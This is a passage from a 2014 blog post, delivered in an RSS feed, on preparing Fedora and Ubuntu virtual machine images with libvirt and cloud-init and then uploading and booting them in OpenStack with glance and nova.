<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">virt-install</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">base_server</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--ram</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">1024</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--cdrom=./Fedora-20-x86_64-netinst.iso</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">--disk </span><span style="color: #96D0FF">path=./server.qcow2,format=qcow2</span></span></code></pre></div>
<p>To install Ubuntu Server on a raw disk image:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">virt-install</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">base_server</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--ram</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">1024</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--cdrom=./ubuntu-12.04.4-server-amd64.iso</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">--disk </span><span style="color: #96D0FF">path=./server.img,format=raw</span></span></code></pre></div>
<p>You should follow the standard install steps that you normally would
when setting up your distribution. But here are some tips for each:</p>
<p>Fedora:</p>
<ul>
<li>Choose minimal install -- by default it selects "GNOME".</li>
</ul>
<p>Ubuntu:</p>
<ul>
<li>
<p>Be sure to select OpenSSH server -- it won't install it by
default.</p>
</li>
<li>
<p>On Ubuntu 12.04, there is a bug that makes it hang after running
<code>fsck</code>. You will need to edit grub to get it to boot, hit _<a href="">e</a> at
the boot prompt and add "nomodeset" on the linux line. You will
know that you need to do this if your boot hangs on fsck:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">fsck</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">from</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">util-linux</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">2.20</span><span style="color: #96D0FF">.1</span></span>
<span data-line=""><span style="color: #F69D50">/dev/mapper/ubuntu--vg-root:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">clean,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">57106</span><span style="color: #96D0FF">/441504</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">files,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">286779</span><span style="color: #96D0FF">/1764352</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">blocks</span></span>
<span data-line=""><span style="color: #F69D50">/dev/sda1:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">clean,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">230</span><span style="color: #96D0FF">/62248</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">files,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">39833</span><span style="color: #96D0FF">/248832</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">blocks</span></span></code></pre></div>
</li>
</ul>
<h1>Preparing image for openstack</h1>
<p>To prepare a virtual machine for the cloud, you will need to install the
<code>cloud-init</code> package, which allows the cloud providers to inject certain
system settings when creating servers based on the image. These are
things like hostname and ssh keys.</p>
<p>On Fedora:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">yum</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cloud-init</span></span></code></pre></div>
<p>On Ubuntu:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cloud-init</span></span></code></pre></div>
<p>Then you need to just configure <code>cloud-init</code> by editing
<code>/etc/cloud/cloud.cfg</code> and update the <code>datasources_list</code> section to
include EC2. OpenStack uses EC2 metadata for <code>cloud-init</code>.</p>
<p>You should also verify the user setting in this same config and define
the user you plan to use, it will be where the <code>authorized_keys</code> file is
setup for when the cloud provider injects your SSH key into the server.</p>
<p><code>cloud-init</code> will not create the user for you, it will just assign the
SSH keypair and reset the password. So make sure the user defined in
<code>cloud.cfg</code> is also created on the system.</p>
<p>Once you have your <code>cloud-init</code> settings the way you want them, just
shutdown and run the <code>virt-sysprep</code> command.</p>
<p>On the guest machine:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">shutdown</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-h</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">now</span></span></code></pre></div>
<p>On the host machine:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">virt-sysprep</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">base_server</span></span></code></pre></div>
<h1>Uploading your image to OpenStack</h1>
<p>Using the glance API it is very straightforward to upload the image to
OpenStack. Just run the following command:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">glance</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">image-create</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">base_server</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--disk-format=qcow2</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">--container-format=bare </span><span style="color: #6CB6FF">--is-public=True</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--file</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">server.qcow2</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--progress</span></span></code></pre></div>
<p>Once the image upload completes you will be able to use it immediately
within nova. You can reference it by name or by the id from [glance
image-list]{.title-ref}.</p>
<p>To create your first instance from the image:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">nova</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">boot</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--flavor</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">m1.tiny</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--image</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">base_server</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--key-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">devops</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">\</span></span>
<span data-line=""><span style="color: #ADBAC7">--security-groups </span><span style="color: #96D0FF">free_for_all</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test_server</span></span></code></pre></div>
<p>Obviously the security groups, key name, and flavors are based on your
installation of OpenStack but can all easily be queried from the nova
API:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">nova</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">flavor-list</span></span>
<span data-line=""><span style="color: #F69D50">nova</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secgroup-list</span></span>
<span data-line=""><span style="color: #F69D50">nova</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">keypair-list</span></span></code></pre></div>
<p>And you are done! You'll be able to re-use your new image as a base for
all new instances you spin up in openstack!</p>]]></description>
            <link>https://sontek.net/blog/old/preparing_cloud_images_with_libvirt</link>
            <guid isPermaLink="true">https://sontek.net/blog/old/preparing_cloud_images_with_libvirt</guid>
            <pubDate>Sun, 03 Aug 2014 00:00:00 GMT</pubDate>
        </item>
    </channel>
</rss>